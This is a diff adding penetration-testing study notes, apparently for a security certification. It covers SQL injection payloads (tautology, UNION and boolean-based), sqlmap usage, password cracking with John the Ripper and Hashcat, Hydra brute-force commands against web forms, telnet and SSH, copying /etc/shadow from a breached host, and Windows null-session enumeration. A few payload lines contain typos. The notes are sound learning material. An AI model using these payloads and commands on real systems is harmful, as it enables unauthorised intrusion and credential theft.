@@ -867,3 +867,356 @@
 - Web application hacker's handbook
 
 ### 8.6 SQL Injections
+
+#### 8.6.1 SQL Statements
+
+- SQL syntax
+  
+  - ```sql
+    SELECT <columns list>, FROM <table> WHERE <condition>;
+    ```
+
+- Union command
+  - Performs union between two results
+  
+  - ```sql
+    <SELECT statement> UNION <other SELECT statement>;
+    ```
+
+- Comments in SQL
+  - "#" or "--"
+
+#### 8.6.2 SQL Queries Inside Web App
+
+- The application must
+  1. Connect
+  2. Submit
+  3. Retrieve
+
+#### 8.6.3 Vulnerable Dynamic Queries
+
+- Change expected **$id** value to a condition that is always true
+  - **' OR 'a'='a**
+  - Second condition is always true
+  - Selects all items in database
+
+- Union exploit
+  - Select items with empty id and performing a union with all entries in Accounts table
+  
+  - ```sql
+    ' UNION SELECTS Username, Password  FROM Accounts WHERE 'a'='a;
+     ```
+
+#### 8.6.4 Finding SQL Injections
+
+- Find injection point and craft payload
+- Test every user supplied input
+  - GET parameters
+  - Post parameters
+  - HTTO Headers
+  - etc
+
+- To test input
+  - String terminators
+  - SQL commands(SELECT, UNION,...)
+  - SQL comments
+
+#### 8.6.5 Exploiting Boolean Based SQLi
+
+- MySQL functions
+  - user()
+    - Returns name of the user currently using the database
+  - substring()
+    - Returns a substring of given arguemt
+    - substring([input string], [position], [length])
+
+- SQL allows testing output if a function in a True/False condition
+  - Can therefor iterate through letters of username
+
+    - ```sql
+      ' or substr(user(), 1, 1)= 'a
+      ```
+
+  - When a letter is found, change to next position until entire username is found
+
+#### 8.6.6 UNION Based SQL Injections
+
+- Empties the original queue and shows another attacker controlled querie shown on the page
+
+- SELECT description FROM items WHERE is='' UNION SELECT user(); -- -';
+  - Payload forcing the web app to display user() to output page
+  - The comment part of the payload prevents the original part of the query being parsed by the database
+  - The last ' is the remainder of the original query
+  - The third dash is there because browsers automatically remove trailing spaces in the URL
+
+- Important to find the number of fields in the input
+  - Test UNION with different amounts of fields
+    - ' UNION SELECT null; -- -
+    - ' UNION SELECT null, null; -- -
+    - ' UNION SELECT null, null, null; -- -
+    - etc...
+    - Until one result gives a valid output
+
+- When number of outputs are found, test which display out
+  - Test with known values and observe what the site reflects
+
+- Not only SELECT is vulnerable for injection
+- What does the SQL query do?
+  - Modifing data?
+  - Only displays data?
+
+- Find injection point, then use SQLMap
+
+#### 8.6.6 SQLMap
+
+- sqlmap -u (URL) -p (parameter) --techique=(technique(e.g U))
+- **-b**
+  - Find database banner
+- **--tables**
+  - Find database tables
+- **--current-db <database>**
+  - Find information from a specific database
+- **--columns**
+  - Find columns in database
+- **--dump**
+  - Get values from table
+- **-T**
+  - Specify table
+- **-D**
+  - Specify database
+
+## 9 System Attacks
+
+### 9.1 Password Attacks
+
+#### 9.1.2 John the Ripper
+
+- Mount brute force and dictionairy attacks
+- Check formats supported
+  - **--list=formats**
+- Needs passwords and usernames to be in the same file
+  - Use *unshadow* tool to place in same file
+  - **unshadow plaintext.txt hashes.txt > crackme**
+
+- Brute force attack
+  - **john -incremental -users:<users list> <file to crack>**
+- Brute force a single user
+  - **john -incremental -user:victim crackme**
+- Display passwords recovered
+  - **--show**
+
+- Run john with a dictionairy
+  - **john --wordlist<=custom wordlist file> <file to crack>**
+
+- Mangling with john
+  - Try different common variations of passwords
+  - **john --wordlist<=custom wordlist file> -rules <file to crack>**
+
+#### 9.1.3 Hashcat
+
+- Relies on GPU not CPU to crack passwords
+- **-b**
+  - Run this first to test system
+  - Benchmark test
+
+- **-m**
+  - Hash type
+  - e.g 0 is MD5
+
+- **-a**
+  - Attack type
+  - e.g 0 is dictionairy
+  - Example
+    - **hashcat -m 0 -a 0 -D2 example0.hash example.dict**
+    - MD5 dictionairy attack with hashes from example.hash with example.dict
+
+- **-r** (path to rule file)
+  - Rule based attack
+  - Write rules to file that hashcat can use later for refrence
+  - Write to own file with another rule for each line
+  - Makes the process a lot more faster
+  - https://www.notsosecure.com/one-rule-to-rule-them-all
+    - Most effective rules for cracking passwords
+
+- Mask attack
+  - Guess what kind of symbol is at given position
+  - Could be a lot faster than brute force attacks
+  - Define what kind of symbol should be in a given posistion
+  - Charset
+    - ?l = a-z
+    - ?u = A-Z
+    - ?d = 0-9
+    - ?h = 0-9, a-f
+    - ?H = 0-9, A-F
+    - ?s = "space ! - `
+    - ?a = ?l?u?d?s
+
+#### 9.1.4 Rainbow Tables
+
+- Time processing tradeoff for calculating hashes
+- Contains links between the results of a run of one hashing function and another
+- Reduces cracking time by a large amount
+- Use **Ophcrack** for cracking Windows autentication passwords
+
+## 10 Network Attacks
+
+### 10.1 Authentication Cracking
+
+#### 10.1.1 Hydra
+
+- Can use brute force or dictionairy attacks to authenticate on web servers
+
+- Dictionairy attack
+  - **hydra -L users.txt -P pass.txt <service://server> <options>**
+
+- **-p** or **-P**
+  - Try given password(s) string(s) or from file
+- **-t**
+  - How many paralell tasks to execute
+- **-l** or **-L**
+  - Try login name(s) string(s) or from file
+
+- **-U**
+  - Service model usage details
+  - What options must be specified for the attack to run
+
+- **-f**
+  - Exit after first successfull login
+
+- **-V**
+  - Verbosity
+
+- **http-post-forms**
+  - **hydra <1> http-post-form "/login.php:<2>^USER^& <3>=^PASS^:<4>**
+    1. Login site
+    2. HTML POST user parameter
+    3. HTML POST password parameter
+    4. Unsuccessfull login message from website
+    - Example
+      - **hydra hack.this http-post-form "/login.php:usr^USER^&pwd=^PASS^:invalid credentials -L /usr/share/ncrack/minimal.usr -P /usr/share/seclist/Passwords/rock-you-15.txt -f -V**
+
+- telnet attack
+  - **hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rock-you-10.txt  telnet://<address>**
+
+- SSH attack
+  - **hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rock-you-10.txt  <address> ssh**
+  - Once in, download files with
+    - **scp username@hostname:/path/to/remote/file /path/to/local/file**
+    - Important unix files
+      - **/etc/passwd**
+      - **/etc/shadow**
+
+### 10.2 Windows Shares
+
+#### 10.2.1 NetBIOS
+
+- Network Basic Input Output System
+- View shares on a local network
+- Can supply information when quering a computer
+  - Hostname
+  - NetBIOS name
+  - Domain
+  - Network shares
+
+- Sits between application layer and IP layer
+
+- Small traffic relies on UDP
+  - Name resolution and one to many datagram communication
+- Big traffic relies on TCP
+  - e.g file copy
+  - Uses **NetBIOS** sessions
+
+- MS windows machine when browsing network
+  - Datagrams to list the shares and the machines
+  - Names to find workgroups
+  - Sessions to transmit data to and from a Windows share
+
+#### 10.2.2 Shares
+
+- A windows machine can share a file or a directory on the network
+- Remote and local users can access the resource
+- Users just has to turn on File and Printer Sharing service
+- Users can set permissions on shares, choosing permissions for other users on that share
+
+#### 10.2.3 UNC Path
+
+- Universal NAming Conventions paths
+- Authorized users can access shares
+- **\\ServerName\ShareName\file.nat**
+
+#### 10.2.4 Admin Shares
+
+- Default shares for admins and the windows OS
+- **\\ComputerName\C$**
+  - Lets admin access local volume on machine
+- **\\ComputerName\admin$**
+  - Points to windows install dir
+- **\\ComputerName\ipc$**
+  - Used for interprocess communication
+
+### 10.3 Null Sessions
+
+- Used to enumerate info
+  - Passwords
+  - System users
+  - System groups
+  - Running processes
+
+- Remote exploitable
+- Most modern windows systems are not vulnerable, but some legacy systems are
+- Exploit of autheticity for Windows administrative shares
+
+#### 10.3.1 Enumerating Windows Shares on Windows
+
+- **nbtstat**
+  - **nbtstat -A <IP>**
+    - Displays info about a target
+    - <00> = Computer is workstation
+    - UNIQUE = Computer has only one IP
+    - <20> = File sharing is running on the machine
+
+- **NET VIEW**
+  - Once the attacker knows the machine is running the File server service
+  - **NET VIEW <TARGET IP>**
+
+### 10.3.2 Checking for Null Sessions on Windows
+
+- Once found File and Printer Sharing service
+- Example
+  - Exploit IPC$ administrative share
+  - **NET USE \\<target IP address>\IPC$ '' /u: ''**
+    - Conect with empty password and username
+
+#### 10.3.3 Exploiting Null Sessions on Windows
+
+- **enum**
+  - **enum -S <target IP>**
+    - **-S** = Enumerate shares on machine
+    - **-U** = Enumerate users
+    - **-P** = Check password policy
+      - Can help with brute forcing and false positives
+
+- **winfo**
+  - **winfo <target IP> -n**
+    - **-n** = Tell the tool to use null sessions
+
+#### 10.3.4 Enumerating Windows Shares on Linux
+
+- **nmblookup**
+  - **nmblookup -A <target ip address>**
+
+- **smbclient**
+  - FTP-like client to access windows shares
+  - Can also enumerate
+  - **smbclient -L //<target ip> -N**
+    - **-L** = Lookes up what services are available on the target
+    - **-N** = Forces the tool to not ask for password
+
+#### 10.3.5 Checking for Null Sessions on Linux
+
+- **smbclient //<target ip>/<target share> -N**
+
+#### 10.3.6 Exploiting Null Sessions on Linux
+
+- **enum4linux**
+  - Same operations as enum dn winfo, but more features
